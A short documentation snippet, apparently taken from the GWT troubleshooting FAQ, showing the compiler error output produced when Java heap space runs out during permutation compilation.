GWT OutOfMemoryError During Permutation Compilation\nDESCRIPTION: Error message shown when the GWT compiler runs out of memory while compiling permutations. This is common in GWT 1.5+ due to larger libraries and advanced compiler optimizations.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/FAQ_Troubleshooting.md#2025-04-09_snippet_4\n\nLANGUAGE: text\nCODE:\n```\nCompiling permutations\n   Analyzing permutation #1\n      [ERROR] An internal compiler exception occurred\ncom.google.gwt.dev.jjs.InternalCompilerException: Unexpected error during visit.\n        at ...\nCaused by: java.lang.OutOfMemoryError: Java heap space\n```"
  }
]